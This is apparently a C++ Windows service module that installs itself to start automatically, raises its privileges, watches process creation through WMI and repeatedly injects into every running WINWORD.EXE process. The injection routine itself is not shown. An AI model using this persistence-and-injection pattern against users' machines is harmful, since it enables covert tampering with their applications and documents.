#include "StdAfx.h"
#include "ServiceModule.h"

CServiceModule::CServiceModule()
{
	this->m_bExit = FALSE;
	this->m_hStopNotify = CreateEvent(NULL,FALSE,FALSE,NULL);
}

CServiceModule::~CServiceModule()
{

}

//////////////////////////////////////////////////////////////////////

void CServiceModule::Init(LPCTSTR lpszServiceName)
{
	
	_tcscpy_s(this->m_szServiceName,  256, lpszServiceName);
	GetModuleFileName(NULL, m_szLogFilePath, _MAX_PATH);
	PathRemoveFileSpec(m_szLogFilePath);
	PathRemoveBackslash(m_szLogFilePath);
	wcscat_s (m_szLogFilePath, 256, L"\\log.log");

	m_hServiceStatus = NULL;
	m_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	m_status.dwCurrentState = SERVICE_STOPPED;
	m_status.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;//SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	m_status.dwWin32ExitCode = NO_ERROR;
	m_status.dwServiceSpecificExitCode = 0;
	m_status.dwCheckPoint = 0;
	m_status.dwWaitHint = 3000;
}

// Service startup and registration
void CServiceModule::StartMain()
{
	Dp(_T("BaiYi#StartMain"));
	SERVICE_TABLE_ENTRY st[] =
	{
		{ m_szServiceName, _ServiceMain },
		{ NULL, NULL }
	};
	
	if(this->m_bService)
	{
		::StartServiceCtrlDispatcher(st);
	}
	
	if(!this->m_bService)
	{
		Run(0,NULL);
	}
	
}

void CServiceModule::ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
	Dp(_T("BaiYi#ServiceMain"));
	// Register the control request handler
	m_status.dwCurrentState = SERVICE_START_PENDING;
	m_hServiceStatus = RegisterServiceCtrlHandler(m_szServiceName, _Handler);
	if(m_hServiceStatus == NULL)
	{
		return;
	}
	SetServiceStatus(SERVICE_START_PENDING);

	m_status.dwWin32ExitCode = 0;
	m_status.dwCheckPoint = 0;
	m_status.dwWaitHint = 3000;

	this->m_bExit = FALSE;
	
	SetServiceStatus(SERVICE_RUNNING);
	Dp(_T("run"));
	Run(0,NULL);

	
	SetServiceStatus(SERVICE_STOPPED);
}

void CServiceModule::Handler(DWORD dwOpcode)
{
	Dp(_T("BaiYi#Handler"));
	switch (dwOpcode)
	{
	case SERVICE_CONTROL_SHUTDOWN:
	case SERVICE_CONTROL_STOP:
		this->m_bExit = TRUE;
		SetEvent(m_hStopNotify);
		SetServiceStatus(SERVICE_STOP_PENDING);
		break;
	case SERVICE_CONTROL_PAUSE:
		break;
	case SERVICE_CONTROL_CONTINUE:
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	}
}

void WINAPI CServiceModule::_ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
	Dp(_T("BaiYi#_ServiceMain"));
	ServiceModule()->ServiceMain(dwArgc, lpszArgv);
}
void WINAPI CServiceModule::_Handler(DWORD dwOpcode)
{
	Dp(_T("BaiYi#_Handler"));
	ServiceModule()->Handler(dwOpcode); 
}

// Logging functions
void CServiceModule::LogEvent(LPCTSTR pFormat, ...)
{
	Dp(_T("BaiYi#LogEvent"));
	//TCHAR   szMsg[4096];
	TCHAR*   szMsg;
	HANDLE  hEventSource;
	LPTSTR  lpszStrings[1];
	va_list pArg;
	CString strMsg;

	//HKEY  hKey;		
	DWORD dwBufLen	= 0;
	DWORD dwType	= REG_DWORD;
	DWORD dwDbgFlag = 0;
	dwBufLen = sizeof(DWORD);

	szMsg = strMsg.GetBuffer(1024*1024);
	//RegOpenKeyEx( HKEY_LOCAL_MACHINE, _T("SOFTWARE"), 0, KEY_QUERY_VALUE, &hKey );
	//if( hKey!=NULL )
	//{			
	//	RegQueryValueEx( hKey, _T("DbgFlag"), NULL, &dwType, (LPBYTE)&dwDbgFlag, &dwBufLen);
	//	RegCloseKey( hKey );
	//}

	//if (dwDbgFlag <= 0)
	//{
	//	return;
	//}

	va_start(pArg, pFormat);
	_vstprintf_s(szMsg, 4096, pFormat, pArg);
	va_end(pArg);


	lpszStrings[0] = szMsg;

	/* Get a handle to use with ReportEvent(). */
	hEventSource = RegisterEventSource(NULL, m_szServiceName);
	if (hEventSource != NULL)
	{
		/* Write to event log. */
		ReportEvent(hEventSource, EVENTLOG_INFORMATION_TYPE, 0, 15011, NULL, 1, 0, (LPCTSTR*) &lpszStrings[0], NULL);
		DeregisterEventSource(hEventSource);
	}
}

void CServiceModule::LogEvent2(LPCTSTR pFormat, ...)
{
}

void CServiceModule::SetServiceStatus(DWORD dwState)
{
	m_status.dwCurrentState = dwState;
	::SetServiceStatus(m_hServiceStatus, &m_status);
}

/////////////////////////////////////////////////////////////////////////////

BOOL CServiceModule::IsInstalled()
{
	Dp(_T("BaiYi#IsInstalled"));
	BOOL bResult = FALSE;

	SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hSCM != NULL)
	{
		SC_HANDLE hService = ::OpenService(hSCM, m_szServiceName, SERVICE_QUERY_CONFIG);
		if (hService != NULL)
		{
			bResult = TRUE;
			::CloseServiceHandle(hService);
		}
		::CloseServiceHandle(hSCM);
	}
	return bResult;
}

BOOL CServiceModule::Install()
{
	Dp(_T("BaiYi#Install"));
	if (IsInstalled())
	{
		//this->Uninstall();
		Dp(_T("Installed!"));
		return TRUE;
	}

	SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCM == NULL)
	{
		return FALSE;
	}

	// Get the executable file path
	TCHAR szFilePath[_MAX_PATH];
	::GetModuleFileName(NULL, szFilePath, _MAX_PATH);

	SC_HANDLE hService = ::CreateService(
		hSCM, m_szServiceName, m_szServiceName,
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
		szFilePath, NULL, NULL, NULL, NULL, NULL);

	if (hService == NULL)
	{
		::CloseServiceHandle(hSCM);
		return FALSE;
	}

	SERVICE_STATUS status;
	BOOL bRes = ::QueryServiceStatus(hService, &status);
	if(!bRes)
	{
		CloseServiceHandle(hService);
		CloseServiceHandle(hSCM);
		return FALSE;
	}

	if(status.dwCurrentState != SERVICE_RUNNING)
	{
		bRes = ::StartService(hService, NULL, NULL);
		if(!bRes)
		{
			CloseServiceHandle(hService);
			CloseServiceHandle(hSCM);
			return FALSE;
		}
	}

	::CloseServiceHandle(hService);
	::CloseServiceHandle(hSCM);

	Dp(_T("Install success!"));
	return TRUE;
}

BOOL CServiceModule::Uninstall()
{
	Dp(_T("BaiYi#Uninstall"));
	if (!IsInstalled())
	{
		Dp(_T("No Install!"));
		return TRUE;
	}

	SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hSCM == NULL)
	{
		return FALSE;
	}

	SC_HANDLE hService = ::OpenService(hSCM, m_szServiceName, SERVICE_STOP | DELETE);

	if (hService == NULL)
	{
		::CloseServiceHandle(hSCM);
		return FALSE;
	}
	SERVICE_STATUS status;
	::ControlService(hService, SERVICE_CONTROL_STOP, &status);

	BOOL bDelete = ::DeleteService(hService);
	::CloseServiceHandle(hService);
	::CloseServiceHandle(hSCM);

	if (bDelete)
	{
		Dp(_T("UnInstall success!"));
		return TRUE;
	}

	return FALSE;
}

BOOL CServiceModule::StartSevice()
{
	Dp(_T("BaiYi#StartSevice"));
	BOOL bRes = TRUE;

	SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCM == NULL)
	{
		return FALSE;
	}

	SC_HANDLE hService = ::OpenService(hSCM, m_szServiceName, SERVICE_ALL_ACCESS | DELETE);
	if (hService == NULL)
	{
		::CloseServiceHandle(hSCM);
		return FALSE;
	}

	SERVICE_STATUS status;
	bRes = ::QueryServiceStatus(hService, &status);
	if(!bRes)
	{
		CloseServiceHandle(hService);
		CloseServiceHandle(hSCM);
		return FALSE;
	}

	if(status.dwCurrentState != SERVICE_RUNNING)
	{
		bRes = ::StartService(hService, NULL, NULL);
		if(!bRes)
		{
			CloseServiceHandle(hService);
			CloseServiceHandle(hSCM);
			return FALSE;
		}
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCM);
	return TRUE;
}

// 开始执行注入准备操作
DWORD	 WinWordPid = 0;
void CServiceModule::Run(DWORD dwArgc, LPTSTR* lpszArgv)
{
	Dp(_T("BaiYi#Run"));
	//ServiceModule()->LogEvent(_T("服务程序启动开始！"));
	Dp(_T("服务程序启动开始！"));
	CRegKey  Key;
	if (Key.Open(HKEY_LOCAL_MACHINE,_T("SOFTWARE"),KEY_ALL_ACCESS|KEY_WOW64_64KEY) == ERROR_SUCCESS)
	{
		Key.SetDWORDValue(_T("Pid"), GetCurrentProcessId());
		Key.Close();
	}
	// 注册进和监视器
	RegisterMonitorFun();
	// 等待服务的停止信号
	
	WaitForSingleObject(m_hStopNotify,INFINITE);
	
}

int CServiceModule::RegisterMonitorFun()
{
	Dp(_T("BaiYi#RegisterMonitorFun"));
	HRESULT hres;

	// Step 1: --------------------------------------------------
	// Initialize COM. ------------------------------------------

	hres =  CoInitializeEx(0, COINIT_MULTITHREADED); 
	if (FAILED(hres))
	{
		return 1;                  // Program has failed.
	}

	// Step 2: --------------------------------------------------
	// Set general COM security levels --------------------------
	// Note: If you are using Windows 2000, you need to specify -
	// the default authentication credentials for a user by using
	// a SOLE_AUTHENTICATION_LIST structure in the pAuthList ----
	// parameter of CoInitializeSecurity ------------------------

	hres =  CoInitializeSecurity(
		NULL, 
		-1,                          // COM negotiates service
		NULL,                        // Authentication services
		NULL,                        // Reserved
		RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
		RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
		NULL,                        // Authentication info
		EOAC_NONE,                   // Additional capabilities 
		NULL                         // Reserved
		);


	if (FAILED(hres))
	{
		CoUninitialize();
		return 1;                      // Program has failed.
	}

	// Step 3: ---------------------------------------------------
	// Obtain the initial locator to WMI -------------------------

	IWbemLocator *pLoc = NULL;

	hres = CoCreateInstance(
		CLSID_WbemLocator,             
		0, 
		CLSCTX_INPROC_SERVER, 
		IID_IWbemLocator,
		(LPVOID *) &pLoc);

	if (FAILED(hres))
	{
		CoUninitialize();
		return 1;                 // Program has failed.
	}

	// Step 4: ---------------------------------------------------
	// Connect to WMI through the IWbemLocator::ConnectServer method

	IWbemServices *pSvc = NULL;

	// Connect to the local root\cimv2 namespace
	// and obtain pointer pSvc to make IWbemServices calls.
	hres = pLoc->ConnectServer(
		_bstr_t(L"ROOT\\CIMV2"), 
		NULL,
		NULL, 
		0, 
		NULL, 
		0, 
		0, 
		&pSvc
		);

	if (FAILED(hres))
	{
		pLoc->Release();     
		CoUninitialize();
		return 1;                // Program has failed.
	}



	// Step 5: --------------------------------------------------
	// Set security levels on the proxy -------------------------

	hres = CoSetProxyBlanket(
		pSvc,                        // Indicates the proxy to set
		RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx 
		RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx 
		NULL,                        // Server principal name 
		RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
		RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
		NULL,                        // client identity
		EOAC_NONE                    // proxy capabilities 
		);

	if (FAILED(hres))
	{
		pSvc->Release();
		pLoc->Release();     
		CoUninitialize();
		return 1;               // Program has failed.
	}

	// Step 6_1: -------------------------------------------------
	// Receive Create event notifications -----------------------------

	// Use an unsecured apartment for security
	IUnsecuredApartment* pUnsecAppC = NULL;

	hres = CoCreateInstance(CLSID_UnsecuredApartment, NULL, 
		CLSCTX_LOCAL_SERVER, IID_IUnsecuredApartment, 
		(void**)&pUnsecAppC);

	EventSink* pSinkC = new EventSink;
	pSinkC->AddRef();

	IUnknown* pStubUnkC = NULL; 
	pUnsecAppC->CreateObjectStub(pSinkC, &pStubUnkC);

	IWbemObjectSink* pStubSinkC = NULL;
	pStubUnkC->QueryInterface(IID_IWbemObjectSink,
		(void **) &pStubSinkC);

	// The ExecNotificationQueryAsync method will call
	// The EventQuery::Indicate method when an event occurs
	hres = pSvc->ExecNotificationQueryAsync(
		_bstr_t("WQL"), 
		_bstr_t("SELECT * " 
		"FROM __InstanceCreationEvent WITHIN 0.01 "
		"WHERE TargetInstance ISA 'Win32_Process'"), 
		WBEM_FLAG_SEND_STATUS, 
		NULL, 
		pStubSinkC);

	// Check for errors.
	if (FAILED(hres))
	{
		printf("ExecNotificationQueryAsync failed "
			"with = 0x%X\n", hres);
		pSvc->Release();
		pLoc->Release();
		pUnsecAppC->Release();
		pStubUnkC->Release();
		pSinkC->Release();
		pStubSinkC->Release();
		CoUninitialize();    
		return 1;
	}

	// Step 6: -------------------------------------------------
	// Receive Deletion event notifications -----------------------------

	// Use an unsecured apartment for security
	IUnsecuredApartment* pUnsecAppD = NULL;

	hres = CoCreateInstance(CLSID_UnsecuredApartment, NULL, 
		CLSCTX_LOCAL_SERVER, IID_IUnsecuredApartment, 
		(void**)&pUnsecAppD);

	EventSink* pSinkD = new EventSink;
	pSinkD->AddRef();

	IUnknown* pStubUnkD = NULL; 
	pUnsecAppD->CreateObjectStub(pSinkD, &pStubUnkD);

	IWbemObjectSink* pStubSinkD = NULL;
	pStubUnkD->QueryInterface(IID_IWbemObjectSink,
		(void **) &pStubSinkD);

	// The ExecNotificationQueryAsync method will call
	// The EventQuery::Indicate method when an event occurs
	hres = pSvc->ExecNotificationQueryAsync(
		_bstr_t("WQL"), 
		_bstr_t("SELECT * " 
		"FROM __InstanceDeletionEvent WITHIN 10 "
		"WHERE TargetInstance ISA 'Win32_Process'"), 
		WBEM_FLAG_SEND_STATUS, 
		NULL, 
		pStubSinkD);

	// Check for errors.
	if (FAILED(hres))
	{
		printf("ExecNotificationQueryAsync failed "
			"with = 0x%X\n", hres);
		pSvc->Release();
		pLoc->Release();
		pUnsecAppD->Release();
		pStubUnkD->Release();
		pSinkD->Release();
		pStubSinkD->Release();
		CoUninitialize();    
		return 1;
	}

	// Wait for the event
	// 找到WINWORD.EXE进程ID并注入其中
	Func()->SetAllPrivileges(TRUE);
	do{
		vector<DWORD> dwWinWordPids;
		GetProcessPid(_T("WINWORD.EXE"), dwWinWordPids);
		int nSize = (int)dwWinWordPids.size();

		for (int i = 0; i < nSize; i++)
		{
			WinWordPid = dwWinWordPids.at(i);
			if (WinWordPid != -1)
			{
				Func()->Inject(WinWordPid);
				Dp(_T("do Inject"));
			}
		}
	} while (WaitForSingleObject(m_hStopNotify, 1000 * 10) != WAIT_OBJECT_0);

	WaitForSingleObject(m_hStopNotify, INFINITE);

	hres = pSvc->CancelAsyncCall(pStubSinkC);
	hres = pSvc->CancelAsyncCall(pStubSinkD);

	// Cleanup
	// ========

	pSvc->Release();
	pLoc->Release();

	pUnsecAppC->Release();
	pStubUnkC->Release();
	pSinkC->Release();
	pStubSinkC->Release();

	pUnsecAppD->Release();
	pStubUnkD->Release();
	pSinkD->Release();
	pStubSinkD->Release();

	CoUninitialize();

	return 0;
}

bool CServiceModule::WriteToLog(LPCTSTR str)
{
	Dp(_T("BaiYi#WriteToLog"));
	FILE* pfile;
	_wsetlocale(LC_ALL,L"chs");//设置中文

	pfile = _wfsopen(m_szLogFilePath, L"a+", _SH_DENYNO);
	if (pfile==NULL)
	{
		return FALSE;
	}
	SYSTEMTIME st = {0};
	GetLocalTime(&st);
	fwprintf_s(pfile,L"[%d-%02d-%02d %02d:%02d:%02d] %s\n", 
		st.wYear,
		st.wMonth,
		st.wDay,
		st.wHour,
		st.wMinute,
		st.wSecond,
		str);
	fclose(pfile);
	
	return true;
}
